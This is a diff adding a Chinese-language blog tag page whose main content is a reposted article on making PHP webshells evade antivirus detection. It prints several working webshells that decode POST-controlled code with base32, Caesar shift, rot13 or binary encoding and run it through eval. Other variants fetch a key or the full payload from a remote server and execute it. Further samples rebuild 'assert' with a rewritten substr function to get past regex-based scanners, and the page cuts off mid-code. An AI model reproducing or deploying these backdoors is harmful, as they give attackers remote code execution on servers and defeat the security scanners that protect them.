@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    
+    <title>Tag: Webshell | 氕氘氚</title>
+    <meta name="keywords" content="hexo,theme,otakism,otaku"/>
+    <meta name="HandheldFriendly" content="True"/>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="google-site-verification" content=""/>
+    <meta name="baidu-site-verification" content=""/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="Open your eyes to see the light in life">
+<meta property="og:type" content="website">
+<meta property="og:title" content="氕氘氚">
+<meta property="og:url" content="http://example.com/tags/Webshell/index.html">
+<meta property="og:site_name" content="氕氘氚">
+<meta property="og:description" content="Open your eyes to see the light in life">
+<meta property="og:locale">
+<meta property="article:author" content="Szczecin">
+<meta name="twitter:card" content="summary">
+    
+
+    <!-- Favicon -->
+    
+        <link rel="icon" href="/img/favicon.ico" />
+    
+
+    <!-- Font -->
+    <link href="https://fonts.googleapis.com/css?family=Inconsolata|Roboto:300,400,700" rel="stylesheet">
+
+    
+<link rel="stylesheet" href="/style.css">
+
+    <script>
+      function setLoadingBarProgress(num) {
+        document.getElementById('loading-bar').style.width = num + "%";
+      }
+    </script>
+
+    
+
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+
+<div id="loading-bar-wrapper">
+  <div id="loading-bar"></div>
+</div>
+
+<script>setLoadingBarProgress(20)</script>
+
+<div id="site-wrapper">
+
+    <header id="header">
+    <div id="header-wrapper" class="clearfix">
+        <a id="logo" href="/">
+            <img src="/img/logo.png"/>
+            <span id="site-desc">
+                Be A Gorgeous World
+            </span>
+        </a>
+        <button id="site-nav-switch">
+            <span class="icon icon-menu"></span>
+        </button>
+    </div>
+</header>
+    <script>setLoadingBarProgress(40);</script>
+
+    <main id="main" role="main">
+        
+  <section class="page-header tag">
+    <h1>- <span>Webshell</span> -</h1>
+  </section>
+
+
+
+
+
+
+<section class="post-list">
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2024/01/19/Webshell-Bypass/">
+                一些webshell免杀的技巧
+            </a>
+        </h2>
+    
+    <time>
+        Jan 19, 2024
+    </time>
+    <section class="content">
+        <h1><span id="一些webshell免杀的技巧">一些webshell免杀的技巧</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9290?time__1311=n4+xuDgD9DyDRD0rxfxDqGNQhavn8P2ne4wD">pureqh</a> 并作补充</p>
+</blockquote>
+<h3><span id="0x00前言">0x00：前言</span></h3><blockquote>
+<p>由于杀软的规则在不断更新 所以很多之前的过杀软方法基本上都不行了 而且随着php7逐渐扩张 assert马也将被淘汰 所以本文将提出几种免杀思路 效果很好 而且不会被杀软的正则和沙盒规则约束。</p>
+</blockquote>
+<h3><span id="0x01自定义加密bypass">0x01：自定义加密Bypass</span></h3><blockquote>
+<p>部分杀软会直接将一些编码函数如Base64、编码后的关键字或组合函数加入了规则 比如某dir+</p>
+<p><img src="/2024/01/19/Webshell-Bypass/1.png" alt="image"></p>
+<p>比如这个 都能被检测出是shell</p>
+<p>所以为了防止这种的规则 自定义加密显然是最优解</p>
+<p>自定义加密可选性多了 只要能把加密后的字符还原回去就行 比如base32 base58 这类的base编码全家桶 或者自定义ascii移位 甚至是对称加密算法等都是可以绕过这类规则检测</p>
+<ul>
+<li>base32编码payload<br>（<a target="_blank" rel="noopener" href="https://github.com/pureqh/webshell%EF%BC%89%EF%BC%9A">https://github.com/pureqh/webshell）：</a></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KUYE</span></span>&#123;</span><br><span class="line">      <span class="keyword">public</span> <span class="variable">$DAXW</span> = <span class="literal">null</span>;</span><br><span class="line">      <span class="keyword">public</span> <span class="variable">$LRXV</span> = <span class="literal">null</span>;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;DAXW = <span class="string">&#x27;mv3gc3bierpvat2tkrnxuzlsn5ossoy&#x27;</span>;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;LRXV = @<span class="title function_ invoke__">SYXJ</span>(<span class="variable">$this</span>-&gt;DAXW);</span><br><span class="line">      @<span class="keyword">eval</span>(<span class="string">&quot;/*GnSpe=u*/&quot;</span>.<span class="variable language_">$this</span>-&gt;LRXV.<span class="string">&quot;/*GnSpe=u*/&quot;</span>);</span><br><span class="line">      &#125;&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">KUYE</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">MNWK</span>(<span class="params"><span class="variable">$QSFX</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$BASE32_ALPHABET</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz234567&#x27;</span>;</span><br><span class="line">  <span class="variable">$NLHB</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="variable">$v</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="variable">$vbits</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>, <span class="variable">$j</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$QSFX</span>); <span class="variable">$i</span> &lt; <span class="variable">$j</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">  <span class="variable">$v</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">      <span class="variable">$v</span> += <span class="title function_ invoke__">ord</span>(<span class="variable">$QSFX</span>[<span class="variable">$i</span>]);</span><br><span class="line">      <span class="variable">$vbits</span> += <span class="number">8</span>;</span><br><span class="line">      <span class="keyword">while</span> (<span class="variable">$vbits</span> &gt;= <span class="number">5</span>) &#123;</span><br><span class="line">          <span class="variable">$vbits</span> -= <span class="number">5</span>;</span><br><span class="line">          <span class="variable">$NLHB</span> .= <span class="variable">$BASE32_ALPHABET</span>[<span class="variable">$v</span> &gt;&gt; <span class="variable">$vbits</span>];</span><br><span class="line">          <span class="variable">$v</span> &amp;= ((<span class="number">1</span> &lt;&lt; <span class="variable">$vbits</span>) - <span class="number">1</span>);&#125;&#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$vbits</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="variable">$v</span> &lt;&lt;= (<span class="number">5</span> - <span class="variable">$vbits</span>);</span><br><span class="line">      <span class="variable">$NLHB</span> .= <span class="variable">$BASE32_ALPHABET</span>[<span class="variable">$v</span>];&#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$NLHB</span>;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SYXJ</span>(<span class="params"><span class="variable">$QSFX</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$NLHB</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="variable">$v</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="variable">$vbits</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>, <span class="variable">$j</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$QSFX</span>); <span class="variable">$i</span> &lt; <span class="variable">$j</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">      <span class="variable">$v</span> &lt;&lt;= <span class="number">5</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$QSFX</span>[<span class="variable">$i</span>] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; <span class="variable">$QSFX</span>[<span class="variable">$i</span>] &lt;= <span class="string">&#x27;z&#x27;</span>)&#123;</span><br><span class="line">          <span class="variable">$v</span> += (<span class="title function_ invoke__">ord</span>(<span class="variable">$QSFX</span>[<span class="variable">$i</span>]) - <span class="number">97</span>);</span><br><span class="line">      &#125; <span class="keyword">elseif</span> (<span class="variable">$QSFX</span>[<span class="variable">$i</span>] &gt;= <span class="string">&#x27;2&#x27;</span> &amp;&amp; <span class="variable">$QSFX</span>[<span class="variable">$i</span>] &lt;= <span class="string">&#x27;7&#x27;</span>) &#123;</span><br><span class="line">          <span class="variable">$v</span> += (<span class="number">24</span> + <span class="variable">$QSFX</span>[<span class="variable">$i</span>]);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable">$vbits</span> += <span class="number">5</span>;</span><br><span class="line">      <span class="keyword">while</span> (<span class="variable">$vbits</span> &gt;= <span class="number">8</span>)&#123;</span><br><span class="line">          <span class="variable">$vbits</span> -= <span class="number">8</span>;</span><br><span class="line">          <span class="variable">$NLHB</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &gt;&gt; <span class="variable">$vbits</span>);</span><br><span class="line">          <span class="variable">$v</span> &amp;= ((<span class="number">1</span> &lt;&lt; <span class="variable">$vbits</span>) - <span class="number">1</span>);&#125;&#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$NLHB</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/19/Webshell-Bypass/2.png" alt="image"></p>
+<ul>
+<li>ascii码移位payload（凯撒加密）</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FKPC</span></span>&#123;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;TQYV = <span class="string">&quot;bs^i%!\MLPQXwbolZ&amp;8&quot;</span>;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;WZDM = @<span class="title function_ invoke__">HHGJ</span>(<span class="variable">$this</span>-&gt;TQYV);</span><br><span class="line">      @<span class="keyword">eval</span>(<span class="string">&quot;/*#jkskjwjqo*/&quot;</span>.<span class="variable language_">$this</span>-&gt;WZDM.<span class="string">&quot;/*sj#ahajsj*/&quot;</span>);</span><br><span class="line">      &#125;&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">FKPC</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">HHGJ</span>(<span class="params"><span class="variable">$UyGv</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$svfe</span> = [];</span><br><span class="line"><span class="variable">$mxAS</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$UyGv</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$f</span>);<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="variable">$svfe</span>[] = <span class="title function_ invoke__">chr</span>((<span class="title function_ invoke__">ord</span>(<span class="variable">$f</span>[<span class="variable">$i</span>])+<span class="number">3</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$mxAS</span> = <span class="title function_ invoke__">implode</span>(<span class="variable">$svfe</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$mxAS</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/19/Webshell-Bypass/3.png" alt="image"></p>
+<p>居然没过webdir+</p>
+<p>那如何解决呢 我们后面再说 当然应付D盾还是绰绰有余了</p>
+<p><img src="/2024/01/19/Webshell-Bypass/4.png" alt="image"></p>
+<p>Rot13加密payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KUYE</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$DAXW</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$LRXV</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;DAXW = <span class="string">&#x27;riny($_CBFG[mreb]);&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;LRXV = @<span class="title function_ invoke__">str_rot13</span>(<span class="variable">$this</span>-&gt;DAXW);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="string">&quot;/*GnSpe=u*/&quot;</span>.<span class="variable language_">$this</span>-&gt;LRXV.<span class="string">&quot;/*GnSpe=u*/&quot;</span>);</span><br><span class="line">        &#125;&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">KUYE</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>二进制转化payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KUYE</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$DAXW</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$LRXV</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;DAXW = <span class="string">&#x27;1100101 1110110 1100001 1101100 101000 100100 1011111 1010000 1001111 1010011 1010100 1011011 1111010 1100101 1110010 1101111 1011101 101001 111011&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;LRXV = @<span class="title function_ invoke__">BinToStr</span>(<span class="variable">$this</span>-&gt;DAXW);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="string">&quot;/*GnSpe=u*/&quot;</span>.<span class="variable language_">$this</span>-&gt;LRXV.<span class="string">&quot;/*GnSpe=u*/&quot;</span>);</span><br><span class="line">        &#125;&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">KUYE</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">BinToStr</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$arr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27; &#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$arr</span> <span class="keyword">as</span> &amp;<span class="variable">$v</span>)&#123;</span><br><span class="line">        <span class="variable">$v</span> = <span class="title function_ invoke__">pack</span>(<span class="string">&quot;H&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">base_convert</span>(<span class="variable">$v</span>, <span class="number">2</span>, <span class="number">16</span>)), <span class="title function_ invoke__">base_convert</span>(<span class="variable">$v</span>, <span class="number">2</span>, <span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">join</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arr</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/19/Webshell-Bypass/5.png" alt="image"></p>
+<p>这里就不列举了 只要方法正确 绕过杀软是很简单的</p>
+</blockquote>
+<h3><span id="0x02通过http获得关键参数">0x02：通过http获得关键参数</span></h3><blockquote>
+<p>上面那个凯撒密码不是被webdir+杀了吗 我们在这里将他绕过</p>
+<p>众所周知凯撒密码需要设置往前或往后移几位ascii 这个参数可以设置为解密方法的输入参数 经过测试 此参数在源码中会被沙盒跑出了 因此不能过百度杀毒 ，那么 我不写本地不就行了 我直接起一个http服务访问文本获得参数值。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FKPC</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="string">&quot;http://xxxxx:8080/1.txt&quot;</span>;</span><br><span class="line">        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$url</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">stream_get_meta_data</span>(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">            <span class="variable">$body</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;x = <span class="variable">$body</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;TQYV = <span class="string">&quot;bs^i%!\MLPQXwbolZ&amp;8&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;WZDM = @<span class="title function_ invoke__">HHGJ</span>(<span class="variable">$this</span>-&gt;TQYV,<span class="variable">$this</span>-&gt;x);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="string">&quot;/*#jkskjwjqo*/&quot;</span>.<span class="variable language_">$this</span>-&gt;WZDM.<span class="string">&quot;/*sj#ahajsj*/&quot;</span>);</span><br><span class="line">        &#125;&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">FKPC</span>();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">HHGJ</span>(<span class="params"><span class="variable">$UyGv</span>,<span class="variable">$x</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$svfe</span> = [];</span><br><span class="line"><span class="variable">$mxAS</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$UyGv</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$f</span>);<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$svfe</span>[] = <span class="title function_ invoke__">chr</span>((<span class="title function_ invoke__">ord</span>(<span class="variable">$f</span>[<span class="variable">$i</span>])+<span class="variable">$x</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$mxAS</span> = <span class="title function_ invoke__">implode</span>(<span class="variable">$svfe</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$mxAS</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/19/Webshell-Bypass/6.png" alt="image"></p>
+<p>当然肯定能用</p>
+<p><img src="/2024/01/19/Webshell-Bypass/7.png" alt="image"></p>
+<p>但是 这转了一圈简直不低碳啊 我不能直接http获取payload吗 …</p>
+<p>简化代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KUYE</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;yshasaui&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="string">&quot;http://xxx/1.txt&quot;</span>;</span><br><span class="line">        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$url</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">stream_get_meta_data</span>(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">            <span class="variable">$body</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$body</span>;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="string">&quot;/*GnSpe=121u*/&quot;</span>.<span class="variable language_">$this</span>-&gt;b.<span class="string">&quot;/*Gn212Spe=u*/&quot;</span>);</span><br><span class="line">        &#125;&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">KUYE</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/19/Webshell-Bypass/8.png" alt="image"></p>
+<p><img src="/2024/01/19/Webshell-Bypass/9.png" alt="image"></p>
+</blockquote>
+<h3><span id="0x03重写函数bypass">0x03：重写函数Bypass</span></h3><blockquote>
+<p>众所周知 正则类杀软最喜欢直接把危险函数加入规则 那么 它杀的是函数名 还是逻辑呢？</p>
+<p>试一试就知道了</p>
+<p>我们的样本如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">substr</span>(<span class="string">&quot;assertxx&quot;</span>,<span class="number">0</span>,<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这是个使用substr函数切割关键字的小马</p>
+<p>直接扔到webdir+杀</p>
+<p><img src="/2024/01/19/Webshell-Bypass/10.png" alt="image"></p>
+<p>毫无疑问的被杀了</p>
+<p>那么 我们重写substr函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mysubstr</span>(<span class="params"><span class="variable">$string</span>, <span class="variable">$start</span> = <span class="number">0</span>, <span class="variable">$length</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$strLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$length</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$length</span> = <span class="variable">$strLength</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$length</span> = (<span class="keyword">int</span>) <span class="variable">$length</span>;</span><br><span class="line">    <span class="variable">$start</span> = <span class="variable">$start</span> &lt; <span class="number">0</span> ? (<span class="variable">$strLength</span> + <span class="variable">$start</span>) : (<span class="variable">$start</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="variable">$length</span> &lt; <span class="number">0</span> ? (<span class="variable">$strLength</span> + <span class="variable">$length</span>) : <span class="variable">$start</span> + <span class="variable">$length</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$start</span> &gt; <span class="variable">$strLength</span> || (<span class="variable">$end</span> - <span class="variable">$start</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (; <span class="variable">$start</span> &lt; <span class="variable">$end</span>; <span class="variable">$start</span> ++) &#123;</span><br><span class="line">        <span class="variable">$result</span> .= <span class="variable">$string</span>[<span class="variable">$start</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后把函数替换</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;assert(xyz@&#x27;</span>;</span><br><span class="line"><span class="variable">$c</span> =  <span class="title function_ invoke__">mysubstr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">6</span>);</span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;zero&#x27;</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mysubstr</span>(<span class="params"><span class="variable">$string</span>, <span class="variable">$start</span> = <span class="number">0</span>, <span class="variable">$length</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$strLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>);</span><br><span class="line">    